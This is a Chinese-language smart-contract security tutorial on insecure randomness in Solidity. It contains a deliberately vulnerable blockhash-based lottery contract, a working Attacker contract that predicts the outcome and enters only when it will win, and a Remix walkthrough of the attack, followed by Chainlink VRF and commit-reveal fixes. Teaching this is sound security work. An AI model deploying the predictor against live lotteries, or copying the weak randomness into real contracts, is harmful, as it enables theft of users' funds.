# 随机数漏洞 (Bad Randomness)

> 💡 **核心要点**
> - 区块链是确定性系统，无法生成真正的随机数
> - 永远不要使用链上变量（block.timestamp、blockhash等）作为随机源
> - 使用 Chainlink VRF 等去中心化预言机获取安全随机数
> - Commit-Reveal 方案适合简单场景

---

## 📚 目录

1. [核心矛盾：确定性 vs 随机性](#1-核心矛盾确定性-vs-随机性)
2. [危险的随机数来源](#2-危险的随机数来源)
3. [攻击实例](#3-攻击实例)
4. [正确的解决方案](#4-正确的解决方案)
5. [实战演练](#5-实战演练)
6. [最佳实践](#6-最佳实践)

---

## 1. 核心矛盾：确定性 vs 随机性

### 1.1 区块链的确定性特性

要理解这个问题，首先要明白区块链的一个根本特性：**确定性 (Determinism)**。

区块链是一个分布式的状态机。为了让全球成千上万的节点都能达成共识，每一笔交易、每一个区块的执行结果都必须是**完全相同、可复现、可验证的**。

如果你在北京运行一个以太坊节点，执行某个区块后得到的结果，必须和在纽约的节点执行同一个区块得到的结果一模一样。

### 1.2 真正的随机数

而**真正的随机数**，其本质是**不可预测、不确定的**。

这两者之间存在着根本的矛盾：
- ❌ 在一个要求所有结果都必须确定的系统里，你无法凭空产生一个不确定的随机数
- ⚠️ 开发者很容易陷入陷阱：试图利用那些看起来"随机"的链上变量来模拟随机数

---

## 2. 危险的随机数来源

以下是开发者最常误用的、极其不安全的伪随机数来源。攻击者可以**预测**或**操纵**这些值。

### ❌ 2.1 block.timestamp 或 now

```solidity
// ❌ 危险！
uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
```

**为什么不安全**：
- 矿工或验证者在创建区块时，对时间戳有一定程度的控制权（通常是几秒的浮动空间）
- 如果一个有利可图的随机结果出现在几秒后，他们可以稍微延迟出块来获得这个结果

### ❌ 2.2 block.number, block.difficulty 等区块变量

```solidity
// ❌ 危险！
uint256 random = uint256(keccak256(abi.encodePacked(
    block.number,
    block.difficulty
))) % 100;
```

**为什么不安全**：
- 这些值对于一个区块内的所有交易都是**固定且公开的**
- 攻击者可以在发起交易前，或者通过一个攻击合约在**同一笔交易内**，读取到这些值
- 从而完美预测出所谓的"随机"结果

### ❌ 2.3 blockhash(block.number - 1)

```solidity
// ❌ 看似随机，实则危险！
uint256 random = uint256(blockhash(block.number - 1)) % 100;
```

**为什么不安全**：
- 这是**最经典的攻击场景**
- 虽然你无法预测未来的区块哈希，但你可以**读取到已经发生的区块哈希**
- 攻击者可以通过一个智能合约来利用这一点

### ❌ 2.4 组合哈希

```solidity
// ❌ 组合多个变量也无济于事！
uint256 random = uint256(keccak256(abi.encodePacked(
    block.timestamp,
    msg.sender,
    block.difficulty
))) % 100;
```

**为什么不安全**：
- **对一堆可预测的输入进行哈希，得到的结果同样是可预测的！**
- 攻击者只需要用和你完全相同的输入和哈希算法，就能计算出相同的结果

---

## 3. 攻击实例

### 3.1 漏洞合约：抽奖系统

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract UnsafeLottery {
    address[] public players;
    address public winner;
    
    function enter() public payable {
        require(msg.value == 1 ether, "Must send 1 ETH to enter");
        players.push(msg.sender);
    }
    
    // ❌ 漏洞所在：使用上一个区块的哈希作为随机源
    function pickWinner() public {
        uint256 index = uint256(blockhash(block.number - 1)) % players.length;
        winner = players[index];
        
        // 转账奖金给中奖者
        (bool success, ) = winner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### 3.2 攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IUnsafeLottery {
    function enter() external payable;
    function pickWinner() external;
    function players(uint256) external view returns (address);
}

contract Attacker {
    IUnsafeLottery public lottery;
    
    constructor(address lotteryAddress) {
        lottery = IUnsafeLottery(lotteryAddress);
    }
    
    // 🎯 攻击函数
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        // 1. 在发起攻击前，先计算出"随机"结果
        uint256 totalPlayers = getPlayerCount() + 1; // 加上自己
        uint256 winningIndex = uint256(blockhash(block.number - 1)) % totalPlayers;
        
        // 2. 预测自己是否会中奖（假设自己是最后一个加入的玩家）
        if (winningIndex == totalPlayers - 1) {
            // 只有在预测到自己会中奖时，才真正参与抽奖
            lottery.enter{value: 1 ether}();
        } else {
            // 如果预测到自己不会中奖，就不参与
            revert("Not going to win, saving gas");
        }
    }
    
    // 获取当前玩家数量
    function getPlayerCount() public view returns (uint256) {
        uint256 count = 0;
        while (true) {
            try lottery.players(count) returns (address) {
                count++;
            } catch {
                break;
            }
        }
        return count;
    }
    
    // 接收奖金
    receive() external payable {}
}
```

### 3.3 攻击流程

1. 攻击者看到抽奖池里已经有很多奖金
2. 他部署 `Attacker` 合约，并将 `UnsafeLottery` 的地址传入
3. 他不断地调用自己 `Attacker` 合约的 `attack()` 函数
4. `attack()` 函数会在**执行的同一笔交易内**，提前计算出如果它此刻加入，中奖号码会是多少
5. 只有当计算出的中奖号码恰好是它自己时，它才会执行 `lottery.enter()`
6. 一旦攻击者成功进入，他就可以调用 `pickWinner()`，由于结果早已被预测，他将**100% 确定中奖**

---

## 4. 正确的解决方案

正确的做法是承认"链上无法产生安全的随机数"，并**从链外获取**，然后**在链上验证**。

### ✅ 4.1 Chainlink VRF（推荐）

这是目前最安全、最主流的解决方案。

#### 工作原理

1. **请求 (Request)**：你的智能合约向 Chainlink 的预言机合约发起一个获取随机数的请求
2. **链下生成 (Off-chain Generation)**：Chainlink 的去中心化预言机网络在**链下**安全地生成一个随机数，同时还会生成一个**密码学证明 (cryptographic proof)**
3. **回调与验证 (Callback & Verification)**：Chainlink 节点调用你的合约，将生成的随机数和证明一起发回。你的合约可以在**链上**验证这个证明的有效性

#### 为什么安全？

- **链下生成**：随机数的产生过程脱离了区块链环境，矿工/验证者完全无法预测或影响它
- **可验证性**：密码学证明确保了即使是 Chainlink 节点本身也无法操纵或选择性地提交对自己有利的随机数

#### 代码示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract SafeLottery is VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    
    address[] public players;
    address public recentWinner;
    uint256 public randomResult;
    
    // VRF 相关状态
    mapping(bytes32 => address[]) public requestToPlayers;
    
    constructor(
        address _vrfCoordinator,
        address _link,
        bytes32 _keyHash,
        uint256 _fee
    ) VRFConsumerBase(_vrfCoordinator, _link) {
        keyHash = _keyHash;
        fee = _fee;
    }
    
    function enter() public payable {
        require(msg.value == 1 ether, "Must send 1 ETH");
        players.push(msg.sender);
    }
    
    // ✅ 请求随机数
    function pickWinner() public {
        require(players.length > 0, "No players");
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK");
        
        bytes32 requestId = requestRandomness(keyHash, fee);
        requestToPlayers[requestId] = players;
    }
    
    // ✅ Chainlink 回调函数
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        require(randomness > 0, "Random not found");
        
        address[] memory playersForRequest = requestToPlayers[requestId];
        uint256 indexOfWinner = randomness % playersForRequest.length;
        recentWinner = playersForRequest[indexOfWinner];
        randomResult = randomness;
        
        // 转账奖金
        (bool success, ) = recentWinner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
        
        // 重置游戏
        players = new address[](0);
    }
}
```

### ✅ 4.2 Commit-Reveal 方案

这是一种经典的密码学方案，不依赖于预言机，适合简单场景。

#### 工作原理

**阶段一：承诺 (Commit)**
- 所有参与者先提交一个**秘密值 (`secret`) 的哈希值 `keccak256(secret)`**
- 合约将这些哈希值记录下来

**阶段二：揭示 (Reveal)**
- 在承诺阶段结束后，所有参与者再提交他们原始的 `secret`
- 合约会验证每个参与者提交的 `secret` 的哈希值是否与承诺阶段记录的一致

**生成随机数**：
- 将所有被成功验证的 `secret` 组合起来再进行一次哈希，生成最终的随机数

#### 代码示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract CommitRevealLottery {
    struct Commitment {
        bytes32 commit;
        bool revealed;
        uint256 value;
    }
    
    mapping(address => Commitment) public commitments;
    address[] public participants;
    
    uint256 public commitPhaseEnd;
    uint256 public revealPhaseEnd;
    uint256 public randomSeed;
    
    // 阶段1：承诺
    function commit(bytes32 _commit) public payable {
        require(block.timestamp < commitPhaseEnd, "Commit phase ended");
        require(msg.value == 0.1 ether, "Must send 0.1 ETH");
        require(commitments[msg.sender].commit == bytes32(0), "Already committed");
        
        commitments[msg.sender].commit = _commit;
        participants.push(msg.sender);
    }
    
    // 阶段2：揭示
    function reveal(uint256 _value, bytes32 _salt) public {
        require(block.timestamp >= commitPhaseEnd, "Commit phase not ended");
        require(block.timestamp < revealPhaseEnd, "Reveal phase ended");
        require(!commitments[msg.sender].revealed, "Already revealed");
        
        // 验证承诺
        bytes32 commit = keccak256(abi.encodePacked(_value, _salt, msg.sender));
        require(commit == commitments[msg.sender].commit, "Invalid reveal");
        
        commitments[msg.sender].revealed = true;
        commitments[msg.sender].value = _value;
        
        // 累积随机种子
        randomSeed ^= _value;
    }
    
    // 生成中奖者
    function pickWinner() public {
        require(block.timestamp >= revealPhaseEnd, "Reveal phase not ended");
        require(randomSeed != 0, "No randomness");
        
        uint256 winnerIndex = randomSeed % participants.length;
        address winner = participants[winnerIndex];
        
        (bool success, ) = winner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
```

**优点**：
- ✅ 去中心化程度高，不依赖外部服务
- ✅ 无需支付预言机费用

**缺点**：
- ❌ 用户体验差（需要两步操作）
- ❌ 存在"最后揭示者攻击"（最后一个揭示的人可以根据别人的 `secret` 决定自己是否揭示）
- ⚠️ 可以通过保证金等方式缓解

---

## 5. 实战演练

### 5.1 Remix 练习：攻击不安全的抽奖

1. 部署 `UnsafeLottery` 合约
2. 用几个不同账户 `enter()`，每次发送 1 ETH
3. 部署 `Attacker` 合约
4. 调用 `Attacker.attack()`，观察它如何预测并只在会中奖时参与
5. 调用 `UnsafeLottery.pickWinner()`
6. 查看结果：攻击者中奖

### 5.2 练习：实现安全的抽奖

使用 Chainlink VRF 重新实现抽奖合约。

---

## 6. 最佳实践

### 6.1 黄金法则

**绝对禁忌**：**永远不要**使用任何链上变量（如 `block.timestamp`, `blockhash` 等）作为关键业务（尤其是涉及资金）的随机数来源。

### 6.2 推荐方案

| 场景 | 推荐方案 | 理由 |
|------|---------|------|
| **高价值应用** | Chainlink VRF | 最安全、最可靠 |
| **简单游戏** | Commit-Reveal | 去中心化、成本低 |
| **链下验证** | RANDAO | 以太坊信标链 |

### 6.3 Chainlink VRF 使用要点

1. ✅ 确保合约有足够的 LINK 代币支付费用
2. ✅ 实现 `fulfillRandomness` 回调函数
3. ✅ 处理好回调的 Gas 限制
4. ✅ 考虑使用 VRF V2（支持订阅模式，更便宜）

### 6.4 安全检查清单

- [ ] 从不使用 `block.timestamp` 生成随机数
- [ ] 从不使用 `blockhash` 生成随机数
- [ ] 从不使用 `block.number` 等区块变量
- [ ] 使用 Chainlink VRF 或 Commit-Reveal
- [ ] 测试了随机数生成的所有路径
- [ ] 审计了随机数相关的经济模型

---

## 📚 学习资源

### 官方文档
- [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction)
- [Commit-Reveal Schemes](https://medium.com/@chris.atlassian/commit-reveal-schemes-on-ethereum-ecc7c5d4a835)

### 真实案例
- [Fomo3D 随机数问题](https://medium.com/@amanusk/breaking-fomo3d-by-predicting-the-winner-7e14530b3a30)
- [SmartBillions 随机数漏洞](https://www.reddit.com/r/ethereum/comments/74d3dc/smartbillions_lottery_contract_just_got_hacked/)

### 在线挑战
- [Ethernaut - Coin Flip](https://ethernaut.openzeppelin.com/level/3)
- [Capture the Ether - Predict the future](https://capturetheether.com/challenges/lotteries/predict-the-future/)

---

## ✅ 学习检查清单

完成本章节后，确认你已经：

- [ ] 理解了区块链确定性与随机性的矛盾
- [ ] 知道为什么不能使用链上变量生成随机数
- [ ] 掌握了 Chainlink VRF 的使用方法
- [ ] 理解了 Commit-Reveal 方案的原理
- [ ] 在 Remix 中复现了随机数攻击
- [ ] 实现了安全的随机数抽奖合约
- [ ] （可选）完成了 Ethernaut Coin Flip 挑战

---

## 🎯 下一步

1. ✅ 在 Remix 中实战随机数攻击
2. ✅ 完成 Ethernaut Level 3: Coin Flip
3. ✅ 部署一个使用 Chainlink VRF 的抽奖合约
4. ✅ 继续学习下一个漏洞：**06-delegatecall风险**
5. ✅ 更新你的 `PROGRESS.md`

---

**记住**：
- 🎲 **链上无真正随机数**
- 🔗 **使用 Chainlink VRF 获取安全随机性**
- 🧪 **Commit-Reveal 适合简单场景**
- ⚠️ **随机数漏洞可导致严重经济损失**

祝你学习顺利！🚀

